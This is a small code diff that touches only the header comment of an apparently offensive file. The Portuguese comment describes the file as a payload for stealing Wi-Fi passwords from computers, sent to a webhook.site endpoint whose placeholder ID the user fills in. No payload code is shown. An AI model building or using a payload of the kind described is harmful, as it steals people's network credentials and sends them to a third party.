@@ -1,5 +1,5 @@
 /*  
- *  Payload para roubar senhas Wi-Fi de computadores, necessário atualizar o ID do webhook.site, procurar por INSIRA-SEU-ID
+ *  Payload para roubar senhas Wi-Fi de computadores, necessário atualizar o ID do webhook.site, procurar por INSIRA-SEU-ID.
  */
 
 
